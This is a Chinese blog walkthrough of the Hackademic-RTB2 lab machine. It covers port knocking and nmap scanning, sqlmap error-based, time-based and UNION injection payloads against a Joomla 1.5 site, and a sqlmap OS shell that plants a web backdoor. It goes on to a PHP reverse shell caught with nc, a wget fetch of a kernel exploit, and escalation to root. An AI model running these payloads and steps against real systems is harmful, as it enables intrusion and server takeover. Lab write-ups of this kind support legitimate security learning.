<p>再二进制解码,<span class="exturl" data-url="aHR0cDovL3d3dy5zbmFya2xlcy5uZXQvc2NyaXB0cy9zbmVhay9zbmVhay5waHA=">SNEAK: Snarkles.Net Encryption Assortment Kit - Version 1.28<i class="fa fa-external-link-alt"></i></span>,得到</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1001:1101:1011:1001</span><br></pre></td></tr></table></figure>

<p>看来是做了端口碰撞措施，端口碰撞的主要目的是通过进行端口扫描来防止攻击者扫描系统以寻找可能被利用的服务，因为除非攻击者发送正确的碰撞顺序，否则受保护的端口将显得关闭。编写下列bash脚本打开666端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> 1001 1101 1011 1001</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">nc 192.168.84.143 80 <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>运行脚本，稍等片刻端口即可打开</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ./knock.sh</span></span><br></pre></td></tr></table></figure>

<p>进一步的版本扫描表明这是多播DNS协议。找不到任何可利用的东西。再次使用详细标志和–packet-trace选项运行Nmap，这一次它返回了一个新端口：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -v -sS -Pn -T4 --packet-trace 192.168.84.142</span><br><span class="line"></span><br><span class="line">NSE: TCP 192.168.84.135:52112 &gt; 192.168.84.142:666 | CLOSE</span><br><span class="line">NSOCK INFO [20.7300s] nsock_iod_delete(): nsock_iod_delete (IOD <span class="comment">#70)</span></span><br><span class="line">NSE: TCP 192.168.84.135:41738 &gt; 192.168.84.142:80 | CLOSE</span><br><span class="line">NSOCK INFO [20.7300s] nsock_iod_delete(): nsock_iod_delete (IOD <span class="comment">#71)</span></span><br><span class="line">Completed NSE at 02:17, 0.10s elapsed</span><br><span class="line">Initiating NSE at 02:17</span><br><span class="line">Completed NSE at 02:17, 0.00s elapsed</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.84.142</span><br><span class="line">Host is up (0.00049s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">80/tcp  open  http    Apache httpd 2.2.14 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.2.14 (Ubuntu)</span><br><span class="line">|_http-title: Hackademic.RTB2</span><br><span class="line">666/tcp open  http    Apache httpd 2.2.14 ((Ubuntu))</span><br><span class="line">|_http-generator: Joomla! 1.5 - Open Source Content Management</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-robots.txt: 14 disallowed entries </span><br><span class="line">| /administrator/ /cache/ /components/ /images/ </span><br><span class="line">| /includes/ /installation/ /language/ /libraries/ /media/ </span><br><span class="line">|_/modules/ /plugins/ /templates/ /tmp/ /xmlrpc/</span><br><span class="line">|_http-server-header: Apache/2.2.14 (Ubuntu)</span><br><span class="line">|_http-title: Hackademic.RTB2</span><br></pre></td></tr></table></figure>

<p>一定是以前报告为已过滤的端口。 版本扫描显示这实际上是另一台Web服务器！nmap牛逼！！！firefox访问666端口</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub45.jpg"></p>
<p>可以看到是joomla 1.5 templates版本的。</p>
<h3 id="使用自己的方法getshell"><a href="#使用自己的方法getshell" class="headerlink" title="使用自己的方法getshell"></a>使用自己的方法getshell</h3><p>点击下图所示的位置，burp抓包保存为sqlmap.txt，然后sqlmap -r跑此包,发现是dba权限的注入能–os-shell，多年前的老靶机果真是够垃圾，我主要是用来学习各种漏洞知识点，以便于实战碰到的话，能够迅速联想到是什么漏洞并且成功利用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt --is-dba</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                           </span><br><span class="line"> ___ ___[<span class="string">&#x27;]_____ ___ ___  &#123;1.3.12#stable&#125;                                                              </span></span><br><span class="line"><span class="string">|_ -| . [)]     | .&#x27;</span>| . |                                                                              </span><br><span class="line">|___|_  [<span class="string">&quot;]_|_|_|__,|  _|                                                                              </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 03:21:49 /2019-12-12/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[03:21:49] [INFO] parsing HTTP request from &#x27;sqlmap.txt&#x27;</span></span><br><span class="line"><span class="string">[03:21:49] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span></span><br><span class="line"><span class="string">[03:21:49] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: letter (GET)</span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...&#x27; AND (SELECT 4640 FROM(SELECT COUNT(*),CONCAT(0x7170786b71,(SELECT (ELT(4640=4640,1))),0x716b787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uVyL&amp;Itemid=3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...&#x27; AND (SELECT 1182 FROM (SELECT(SLEEP(5)))sLUv)-- PIge&amp;Itemid=3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: MySQL UNION query (NULL) - 2 columns</span></span><br><span class="line"><span class="string">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...&#x27; UNION ALL SELECT NULL,CONCAT(0x7170786b71,0x5248524f517a4a6d7669416152587a486a48704b4a45444c534d74786659424f614f7147534d7965,0x716b787871)#&amp;Itemid=3</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[03:21:49] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0</span></span><br><span class="line"><span class="string">[03:21:49] [INFO] testing if current user is DBA</span></span><br><span class="line"><span class="string">[03:21:49] [INFO] fetching current user</span></span><br><span class="line"><span class="string">current user is DBA: True</span></span><br><span class="line"><span class="string">[03:21:49] [INFO] fetched data logged to text files under &#x27;/root/.sqlmap/output/192.168.84.142&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 03:21:49 /2019-12-12/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@kali:~# sqlmap -r sqlmap.txt --os-shell</span></span><br><span class="line"><span class="string">        ___</span></span><br><span class="line"><span class="string">       __H__                                                                                           </span></span><br><span class="line"><span class="string"> ___ ___[(]_____ ___ ___  &#123;1.3.12#stable&#125;                                                              </span></span><br><span class="line"><span class="string">|_ -| . [&quot;</span>]     | .<span class="string">&#x27;| . |                                                                              </span></span><br><span class="line"><span class="string">|___|_  [(]_|_|_|__,|  _|                                                                              </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 03:45:59 /2019-12-12/</span><br><span class="line"></span><br><span class="line">[03:45:59] [INFO] parsing HTTP request from <span class="string">&#x27;sqlmap.txt&#x27;</span></span><br><span class="line">[03:45:59] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[03:45:59] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: letter (GET)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><br><span class="line">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...<span class="string">&#x27; AND (SELECT 4640 FROM(SELECT COUNT(*),CONCAT(0x7170786b71,(SELECT (ELT(4640=4640,1))),0x716b787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uVyL&amp;Itemid=3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...&#x27;</span> AND (SELECT 1182 FROM (SELECT(SLEEP(5)))sLUv)-- PIge&amp;Itemid=3</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: MySQL UNION query (NULL) - 2 columns</span><br><span class="line">    Payload: option=com_abc&amp;view=abc&amp;letter=List of content items...<span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x7170786b71,0x5248524f517a4a6d7669416152587a486a48704b4a45444c534d74786659424f614f7147534d7965,0x716b787871)#&amp;Itemid=3</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[03:46:00] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0</span></span><br><span class="line"><span class="string">[03:46:00] [INFO] going to use a web backdoor for command prompt</span></span><br><span class="line"><span class="string">[03:46:00] [INFO] fingerprinting the back-end DBMS operating system</span></span><br><span class="line"><span class="string">[03:46:00] [INFO] the back-end DBMS operating system is Linux</span></span><br><span class="line"><span class="string">which web application language does the web server support?</span></span><br><span class="line"><span class="string">[1] ASP</span></span><br><span class="line"><span class="string">[2] ASPX</span></span><br><span class="line"><span class="string">[3] JSP</span></span><br><span class="line"><span class="string">[4] PHP (default)</span></span><br><span class="line"><span class="string">[03:46:02] [WARNING] unable to automatically retrieve the web server document root</span></span><br><span class="line"><span class="string">what do you want to use for writable directory?</span></span><br><span class="line"><span class="string">[1] common location(s) (&#x27;</span>/var/www/, /var/www/html, /var/www/htdocs, /usr/<span class="built_in">local</span>/apache2/htdocs, /usr/<span class="built_in">local</span>/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs<span class="string">&#x27;) (default)</span></span><br><span class="line"><span class="string">[2] custom location(s)</span></span><br><span class="line"><span class="string">[3] custom directory list file</span></span><br><span class="line"><span class="string">[4] brute force search</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] retrieved web server absolute paths: &#x27;</span>/index~.php<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] trying to upload the file stager on &#x27;</span>/var/www/<span class="string">&#x27; via LIMIT &#x27;</span>LINES TERMINATED BY<span class="string">&#x27; method</span></span><br><span class="line"><span class="string">[03:46:05] [WARNING] reflective value(s) found and filtering out</span></span><br><span class="line"><span class="string">[03:46:05] [WARNING] unable to upload the file stager on &#x27;</span>/var/www/<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] trying to upload the file stager on &#x27;</span>/var/www/<span class="string">&#x27; via UNION method</span></span><br><span class="line"><span class="string">[03:46:05] [WARNING] expect junk characters inside the file as a leftover from UNION query</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] the remote file &#x27;</span>/var/www/tmpussxf.php<span class="string">&#x27; is larger (701 B) than the local file &#x27;</span>/tmp/sqlmap2xlaxhqs4350/tmpgmt8uc8y<span class="string">&#x27; (700B)                                                                  </span></span><br><span class="line"><span class="string">[03:46:05] [INFO] the file stager has been successfully uploaded on &#x27;</span>/var/www/<span class="string">&#x27; - http://192.168.84.142:666/tmpussxf.php</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] the backdoor has been successfully uploaded on &#x27;</span>/var/www/<span class="string">&#x27; - http://192.168.84.142:666/tmpbmblb.php</span></span><br><span class="line"><span class="string">[03:46:05] [INFO] calling OS shell. To quit type &#x27;</span>x<span class="string">&#x27; or &#x27;</span>q<span class="string">&#x27; and press ENTER</span></span><br><span class="line"><span class="string">os-shell&gt; ls</span></span><br><span class="line"><span class="string">do you want to retrieve the command standard output? [Y/n/a] command standard output:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">CHANGELOG.php</span></span><br><span class="line"><span class="string">COPYRIGHT.php</span></span><br><span class="line"><span class="string">CREDITS.php</span></span><br><span class="line"><span class="string">INSTALL.php</span></span><br><span class="line"><span class="string">LICENSE.php</span></span><br><span class="line"><span class="string">LICENSES.php</span></span><br><span class="line"><span class="string">Untitledt.png</span></span><br><span class="line"><span class="string">_installation</span></span><br><span class="line"><span class="string">administrator</span></span><br><span class="line"><span class="string">cache</span></span><br><span class="line"><span class="string">components</span></span><br><span class="line"><span class="string">configuration.php</span></span><br><span class="line"><span class="string">configuration.php-dist</span></span><br><span class="line"><span class="string">htaccess.txt</span></span><br><span class="line"><span class="string">images</span></span><br><span class="line"><span class="string">includes</span></span><br><span class="line"><span class="string">index.php</span></span><br><span class="line"><span class="string">index2.php</span></span><br><span class="line"><span class="string">language</span></span><br><span class="line"><span class="string">libraries</span></span><br><span class="line"><span class="string">logs</span></span><br><span class="line"><span class="string">media</span></span><br><span class="line"><span class="string">modules</span></span><br><span class="line"><span class="string">pC4Hp8kt@Px8PgkV$!</span></span><br><span class="line"><span class="string">plugins</span></span><br><span class="line"><span class="string">robots.txt</span></span><br><span class="line"><span class="string">templates</span></span><br><span class="line"><span class="string">tmp</span></span><br><span class="line"><span class="string">tmpbmblb.php</span></span><br><span class="line"><span class="string">tmpugano.php</span></span><br><span class="line"><span class="string">tmpupcaf.php</span></span><br><span class="line"><span class="string">tmpussxf.php</span></span><br><span class="line"><span class="string">tmpuxtor.php</span></span><br><span class="line"><span class="string">welcome</span></span><br><span class="line"><span class="string">xmlrpc</span></span><br><span class="line"><span class="string">xxx.html</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">os-shell&gt; </span></span><br></pre></td></tr></table></figure>

<p>下面使用–os-shell执行成功后sqlmap生成的上传payload上传kali中的php反弹木马来反弹shell,php反弹木马中修改端口和ip的操作不用我多说</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub46.jpg"></p>
<p>ls查看成功上传的木马，并且浏览器访问，kali端 nc -lvp 5566 监听返回了shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">os-shell&gt; ls</span><br><span class="line"><span class="keyword">do</span> you want to retrieve the <span class="built_in">command</span> standard output? [Y/n/a] <span class="built_in">command</span> standard output:</span><br><span class="line">---</span><br><span class="line">15285</span><br><span class="line">15285.c</span><br><span class="line">CHANGELOG.php</span><br><span class="line">COPYRIGHT.php</span><br><span class="line">CREDITS.php</span><br><span class="line">INSTALL.php</span><br><span class="line">LICENSE.php</span><br><span class="line">LICENSES.php</span><br><span class="line">Untitledt.png</span><br><span class="line">_installation</span><br><span class="line">administrator</span><br><span class="line">bullfuck.php</span><br><span class="line">cache</span><br><span class="line">components</span><br><span class="line">configuration.php</span><br><span class="line">configuration.php-dist</span><br><span class="line">htaccess.txt</span><br><span class="line">images</span><br><span class="line">includes</span><br><span class="line">index.php</span><br><span class="line">index2.php</span><br><span class="line">language</span><br><span class="line">libraries</span><br><span class="line">logs</span><br><span class="line">media</span><br><span class="line">modules</span><br><span class="line">pC4Hp8kt@Px8PgkV$!</span><br><span class="line">php-reverse-shell.php</span><br><span class="line">plugins</span><br><span class="line">robots.txt</span><br><span class="line">templates</span><br><span class="line">tmp</span><br><span class="line">tmpbmblb.php</span><br><span class="line">tmpugano.php</span><br><span class="line">tmpupcaf.php</span><br><span class="line">tmpussxf.php</span><br><span class="line">tmpuxtor.php</span><br><span class="line">welcome</span><br><span class="line">xmlrpc</span><br><span class="line">xxx.html</span><br><span class="line">---</span><br><span class="line">os-shell&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.84.142: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.84.135] from (UNKNOWN) [192.168.84.142] 42982</span><br><span class="line">Linux HackademicRTB2 2.6.32-24-generic <span class="comment">#39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux</span></span><br><span class="line"> 11:18:34 up  7:36,  0 users,  load average: 0.15, 0.11, 0.30</span><br><span class="line">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">/bin/sh: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id </span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$ pwd</span></span><br><span class="line"><span class="string">pwd</span></span><br><span class="line"><span class="string">/var/www</span></span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>Hackademic-RTB2靶机所用的提权exp和Hackademic-RTB1靶机所用的一模一样，<span class="exturl" data-url="aHR0cDovL3d3dy5leHBsb2l0LWRiLmNvbS9leHBsb2l0cy8xNTI4NS8=">下载地址：<i class="fa fa-external-link-alt"></i></span></p>
<p>然后在kali中存在exp的目录下运行python一行代码在局域网中分享下载文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></table></figure>
<p>然后在shell中执行命令下载该exp</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget http://192.168.84.135:8000/15285.c</span><br><span class="line">wget http://192.168.84.135:8000/15285.c</span><br><span class="line">--2019-12-13 05:38:57--  http://192.168.84.135:8000/15285.c</span><br><span class="line">Connecting to 192.168.84.135:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 7155 (7.0K) [text/plain]</span><br><span class="line">Saving to: `15285.c<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100%[======================================&gt;] 7,155       --.-K/s   in 0s      </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2019-12-13 05:38:57 (893 MB/s) - `15285.c&#x27;</span> saved [7155/7155]</span><br></pre></td></tr></table></figure>

<p>编译并运行exp进行提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc 15285.c -o 15285</span><br><span class="line">gcc 15285.c -o 15285</span><br><span class="line">$ ./15285</span><br><span class="line">./15285</span><br><span class="line">[*] Linux kernel &gt;= 2.6.30 RDS socket exploit</span><br><span class="line">[*] by Dan Rosenberg</span><br><span class="line">[*] Resolving kernel addresses...</span><br><span class="line"> [+] Resolved security_ops to 0xc08cac4c</span><br><span class="line"> [+] Resolved default_security_ops to 0xc0773340</span><br><span class="line"> [+] Resolved cap_ptrace_traceme to 0xc02f5060</span><br><span class="line"> [+] Resolved commit_creds to 0xc016dd80</span><br><span class="line"> [+] Resolved prepare_kernel_cred to 0xc016e0c0</span><br><span class="line">[*] Overwriting security ops...</span><br><span class="line">[*] Overwriting <span class="keyword">function</span> pointer...</span><br><span class="line">[*] Triggering payload...</span><br><span class="line">[*] Restoring <span class="keyword">function</span> pointer...</span><br><span class="line">[*] Got root!</span><br><span class="line"><span class="comment"># whoami </span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure>

<p>That’s so great!!!Excellent!!!然后到root文件夹下找到key.txt</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">Desktop  Key.txt</span><br><span class="line"><span class="comment"># cat Key.txt</span></span><br><span class="line">cat Key.txt</span><br><span class="line">iVBORw0KGgoAAAANSUhEUgAAAvQAAAFYCAIAAACziP9JAAAACXBIWXMAAAsTAAALEwEAmpwYAAAg</span><br><span class="line">AElEQVR4nOy9eZhdVZXw/bu35iFVlXmgUiQhBAIJEGKMAQGDb1rpbj5EjYK8KIoy+SniIyC2Q4uC</span><br><span class="line">Nn5tOzI4dAvaKI2CLTgEWmYIGTCBQAbIUEkqVZWa5+lO3x/nXefdt4Y71D3DvbfW78nDk1C3zll3</span><br><span class="line">n332XnuNoCiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiK</span><br><span class="line">oiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiKoiiK</span><br><span class="line">oiiKovhOwG8BlNynAM6AEYhCBGLQCd0Q8lswRVEUZUoS9FsAJfcphUIIQBAKICBajqIoiqL4gSo3</span><br><span class="line">SsYUi1oTlAkVgajPQimKoihTFlVulIyJicHG+m9MzTaKoiiKn6hyoziBpdlguKUURVEUxScK/RZA</span><br><span class="line">yX3C4pMCIhDQOHVFURTFT1S5UTLGUm4K5J8FiT6rKIqiKG6jyo2SMSEjlDgGQbXcKIqiKH6iMTdK</span><br><span class="line">xtiuqCAUQolOK0VRFMVP1HKjOEEYCiFqZE4piqIoik+ocqM4QRSKxD+FTitFUZQpSTVUwwC0+SyI</span><br><span class="line">7kKKE1jKjZ0BHpCCN4qiKMoU4V1QI6XOmmG7n7JocITiBCPSgSEgmVPqmXKPAqjyWwZFURSTpTAT</span><br><span class="line">QjAMEZgJ50OJb+Ko5UZxgigUymyyyhOrcuMSy+BtEIIheA66/ZZHURQFKIQwEF+w/nx4HZp8EEct</span><br><span class="line">N4oThKBIOkxZdW7UJ+UGNbAWwjAEUTjVb3kURVEs2oy0WWsjKIISWAnLfRBHlRvFIezG4EFJm1Ic</span><br><span class="line">52yIwYgsH8A0nyVSFEUBaIM2iEipM7M4yImwymtxVLlRnKBYVHVr042pcuMOsyASP9RFfoukKIpi</span><br><span class="line">8QIchg4IAVAIBaLfzIFTPJVFY24UJyg2bAmq1rhEAUyDXgiK+hjVHqWKomQTu6ECZkMdVEOpxN8E</span><br><span class="line">4UTog2MeCaLKjeIEJVBodGDQaGI3KDbsvZYGOSwRfIqiKFlCP/RDE6yAeVABMSiEclgC7TDkhRTq</span><br><span class="line">llKcoAIwfCU6rdzA9kZZwxuAATH/KoqiZBXD8AocgRE5khVDNSz06P66CylOUGpEE+uccgkrxz4o</span><br><span class="line">Zt4wjMCwz0IpiqJMyC7oACQzvBzmQLkXd9aNSHGCMqN8n1bwc4mQ4ZYKwCAM+C2SoihKYrbG13ed</span><br><span class="line">BfO8uK0qN4pzBI30P8VxwkYBiSCMwIjfIimKoiRmCA4Ydv0yqIZi12+ryo3iBANGwE1AtBzFccKS</span><br><span class="line">XVkgdfwURVGynF1QYewRNV40kFHlRnGCIWm/YAcUq3LjBsNGDy80mlhRlFxgGHqgSM5ms7wIu1Hl</span><br><span class="line">RnGCXtFs7D+q3LhBvzHOeGHaVRRFcYAWKJPTb4kk2LqJKjeKE7RKFRbTeKM4zhCUGH1b1C2lKEpO</span><br><span class="line">0AiVRuepQih194a6BSlOEJNNNyj+KbXcuMEgFMkCUaKB24qi5AhVUGq0ICyRivauoauj4gQh8ZVY</span><br><span class="line">jaXULeUSMbGQRaHM9dVBURTFGQqM0y8Sf+MmarlRnGDYqHCj2VLuERWLbhCmQYnf8iiKoqRCiRGO</span><br><span class="line">WWD0kHENtdwoTjBiBLoWqkXBNQqM4a2EMp/FURQlZwjAWgD6oAuOedvkuFJ2B6+a/qpyozhBwNBs</span><br><span class="line">Qlqk2DXso4811LaLSsknpsOHoBYOwiZo9FseJT/4MYRgBGIQhigcgtfgVU/KgZbGhy4MqeVGyQki</span><br><span class="line">RhyxtdeqcuMGxWK8CctoF6hyk1/UwhdhEHpgNlwB2+Fpv6VScp2LAOiBmCzOYZgPC+DvYCs86bIA</span><br><span class="line">0yV0IQox6He9L57G3ChOEDOsNdo70z3KxP1XqIOcp3wOBqBNlv4orIR3+iyUkvOcBZH4OmR22dUI</span><br><span class="line">rIBrXXZzz4WoWJ17YADCbt7OH8vNp6AWgD/BFh/ur7hCoREsprhEmawOMaNOsZI3nAGF0GJ4G60E</span><br><span class="line">k0WwD1r9FU7JWYKwEAaNpcOeXRHJyo7CxfCIOzpHISyCJtkgmqHPhbvE4/np73pYBcUQhbOgxuv7</span><br><span class="line">K64Qja9wo/qNS1QYNRILvI0HVDxglbxKpuZqqbML/JRLyW1qRI8pMNaNgPEnCBUwA85yR4AzoFzC</span><br><span class="line">MSPQBEPu3MjAc8vNSuiRYKIiWAJ/81oExXns/OQCCYZX3KBSyggVSFRgxG+RFAcphwHjn3a6bBj6</span><br><span class="line">/ZFISYlpUARD8Y9v0gSlVmfEof5xM8SOEYA2eBKOQTWsgaXiqIpCDZwIB6HDiZuavF+cYgXQAK2u</span><br><span class="line">B9zgtXJTCQUQlkNJpesFmBXvML256i5xiWlyzEI0G40mzifelNAE4guB9ECvb0IpcSyC86EcKqAK</span><br><span class="line">amCmvIkhaIej0AH10AE90AcD472nAfn1OTADFsAcmA7V4tmwAm97oAkaYSfsm6zMJcay3ACvQwha</span><br><span class="line">oBn+HhZLKlMM5sEip5Wb5XAG1MvCtRu6Hb3+BHir3BQZiaxRKJJB14N+rhMwDJ663bpHqeH1i7oe</span><br><span class="line">kad4zV+hFmbIwgjE4Bh0wXGfRVMAzoZbYVBevQhEoAPCsosVw6kQhPMkxyICMamRYZlhgvIim8Xc</span><br><span class="line">IzAMIeiSy1rEoAZmw9ugAPbAw9CVptjFRum8iBGN0guPwmVQC0UQg2kwB2rSv8VEFMH3JII4CHvh</span><br><span class="line">qCeZ5z64pWzlJmaoOJ58VcVd7PLEWuTGPYqM10d9UnnJ/XAWLJTwtUHogp1+S5VbFLj2apwFvdAz</span><br><span class="line">3o8CEqs7YhzXx57bC2AEehNWsbPXz5j8GYZhiMIcuBT+I33JC+RQNAuKDa/QCDwFV0CJbMoLYa9z</span><br><span class="line">ys39EIajUABd8Ip3NkhvlZsBuac182IymkquY1bOjak1zjWK5OAVk8VOyT92wk5prxGBTr/lySGq</span><br><span class="line">4LtQBQ3wkAvZuK/DmUapGBs7e9F+JQPGx2Jiv4nBiKHWWIvkMAzCAEQgLOkCRVBq1LWy79I/KbXD</span><br><span class="line">dnQGYD4Uxf+0AUJQIulU051L9LkfZsFh2RqehoMOXTkFvFVuhmEkPgtAyQ9Mt5Rqq+7RI4Frdo1R</span><br><span class="line">JV/p1Tib9PkMnADHoRw+DHXwsKPX3woLYL64HfqgDwYB0UKmiVJSBkVQKQ3gAkamhfXfVtgPx2DA</span><br><span class="line">OKgEjUuVQQmUQbmUIy+EKLyZvthhCeYFqsf7QAMsh2OykheNiW2fBL+AhXAUQhCAp2BbZhdME8/d</span><br><span class="line">Uv1QLJEZmjCcT9jVJ/WxukcvzIGQuqUUZTxKJa3MClo6Ezrgr47e4vcSCGzda0CSfwtFKSkVZSIA</span><br><span class="line">RfB2WGqoFFHohqfhMPRBVIw6iQnKAhua1FsflWiBYLx5yWYIZhrKzXQozky5eQRmQYPEnLwAm7w+</span><br><span class="line">jHmu3AxBOYxI2tRY+56SixTG50lpWLFLRKAMeiCgbilFGUOFuHWiUAgz4BxohD2O3qVngrCbcWmG</span><br><span class="line">j0uFKiAGL8OONO8YlWysyRESewwT1MeqgyL5UQBqoDyDsJtnoAAOSzGbZ+H3DuW0p4PnLoT++Nbn</span><br><span class="line">qtnkB4H4UjdhjblxhwJZg6wznCo3imJi1b63F6ISmA3rodI/kYZhH5TLP6NwwHMZorI+F07Qajci</span><br><span class="line">ao21L0+6REsJbIUCOCg1X56C3/mTM+S5cjNopNUE1HKTLxTIYy0ywooVxzlBxll7SynKKIpgpniI</span><br><span 